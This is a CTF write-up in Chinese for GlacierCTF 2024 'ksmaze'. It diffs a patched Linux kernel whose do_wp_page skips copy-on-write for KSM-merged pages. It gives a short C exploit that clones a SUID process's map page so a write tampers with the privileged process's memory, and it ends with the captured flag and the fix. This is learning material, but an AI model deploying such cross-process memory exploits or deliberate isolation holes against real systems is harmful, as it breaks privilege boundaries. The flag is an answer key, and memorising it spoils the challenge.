# GlacierCTF 2024 ksmaze

## 题目简述

ksmaze 在自定义 Linux 5.10.230 内核的 QEMU 中提供一个 SUID ncurses 迷宫。64×64 地图中央的 `F` 被敌人与墙完全封住，正常移动无法取得 flag。附件同时给出原版和修改版 `vmlinux/bzImage`，说明预期入口是比较内核差异，而不是寻找公开内核 N-day。

补丁破坏了 KSM（Kernel Samepage Merging）页面发生写保护异常时的 Copy-on-Write：两个进程的相同匿名页被 KSM 合并后，攻击者写自己的页不会再复制私有副本，而会直接修改共享物理页。迷宫进程恰好把地图页标记为 `MADV_MERGEABLE`，普通用户程序因此可以制造相同页面，等待 KSM 合并，再跨进程篡改 SUID 迷宫的数据。

虽然赛事目录将本题标为 reverse，决定性结果是利用自定义内核的内存隔离缺陷修改高权限进程，因此按主障碍归入 pwn。

## 解题过程

### 1. 从双内核镜像定位补丁

将原版、修改版 `vmlinux` 转为 ELF 并做函数级 BinDiff，几乎所有函数相似度都是 1.00，唯一显著差异是 `do_wp_page`。仓库随附的截图只是这一工具结果，已转写为文字，不保留图片资源。

源码补丁只有三行有效逻辑：

```diff
 if (PageAnon(vmf->page)) {
     struct page *page = vmf->page;
+    if (PageKsm(page))
+        goto fini;
     if (PageKsm(page) || page_count(page) != 1)
         goto copy;
     ...
     unlock_page(page);
+fini:
     wp_page_reuse(vmf);
     return VM_FAULT_WRITE;
 }
```

正常内核看到 `PageKsm(page)` 会进入 `copy`，为当前进程建立私有可写页。修改版却提前跳到 `wp_page_reuse()`，直接把现有 KSM 页复用为可写，从而令本应只共享相同内容的不同进程继续共享后续写入。

系统启动脚本已启用 `/sys/kernel/mm/ksm/run`，所以无需额外权限开启 KSM。

### 2. 找到可被合并的目标页

迷宫构造函数分配一个恰好 4096 字节且 4096 字节对齐的地图：

```cpp
memory = (unsigned char (*)[64])
    std::aligned_alloc(64 * 64, 64 * 64);
...
madvise(memory, 64 * 64, MADV_MERGEABLE);
```

整个地图正好占一页。地图包含墙 `#`、玩家 `@`、空格、金币 `.`、敌人 `&`、树 `^` 与 flag 格 `F`。移动到 `F` 时，SUID 进程读取 `/flag.txt` 并显示内容。因此目标不是控制流劫持，只需修改这张数据页，让玩家相邻格变成 `F`。

### 3. 制造相同页面并等待 KSM 合并

先从 ncurses 终端捕获完整 64×64 地图，保持包括 `@` 在内的 4096 字节完全一致。生成并运行一个普通用户程序：

```c
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define SIZE (64 * 64)
static const unsigned char maze[SIZE] = {
    /* 捕获到的 4096 字节地图 */
};

int main(void) {
    unsigned char *page = aligned_alloc(SIZE, SIZE);
    memcpy(page, maze, SIZE);
    madvise(page, SIZE, MADV_MERGEABLE);

    sleep(5);                 // 等待 ksmd 发现并合并相同页面
    memset(page, 'F', SIZE);  // 触发被破坏的 KSM 写保护路径
    sleep(800);               // 保持进程和页面存活
}
```

`aligned_alloc(4096,4096)` 确保目标内容不与其他堆数据共页；如果漏掉地图中的任何一个终端字符，KSM 就不会认为两页相同。

### 4. 触发高权限程序读取 flag

在一个 SSH 会话中保持 `/bin/ksmaze` 运行，在另一个会话启动上述程序。KSM 合并后，`memset()` 通过错误的 `wp_page_reuse()` 改写共享物理页，迷宫进程看到的地图也全部变成 `F`。此时向任意方向移动一步，`Maze::move()` 命中：

```cpp
case Maze::FLAG_C:
    update_flag("/flag.txt");
    break;
```

SUID 进程随即显示：

```text
gctf{7019_y0u_3sc4p3d_th3_m4z3_3187}
```

出题人完整说明见 [ksmaze 官方题解](https://ecomaikgolf.com/posts/0011-glacierctf2024-ksmaze/)。其中关于 BinDiff、KSM 补丁、地图页和自动化 exploit 的关键内容均已写入正文，外链只作为原始作者资料保留。

## 方法总结

利用链是“对比双内核镜像 → 定位 `do_wp_page` → 识别 KSM 页面跳过 CoW → 复制 SUID 进程的整页地图 → `MADV_MERGEABLE` 等待合并 → 写自己的页同步篡改目标页”。它没有改写 SUID 二进制，也不需要内核地址泄露或 ROP；漏洞本质是私有匿名页在写入后仍跨进程共享，直接破坏了内存隔离。修复方式是恢复 `PageKsm(page) -> copy` 路径，任何 KSM 页写入都必须先建立私有副本。
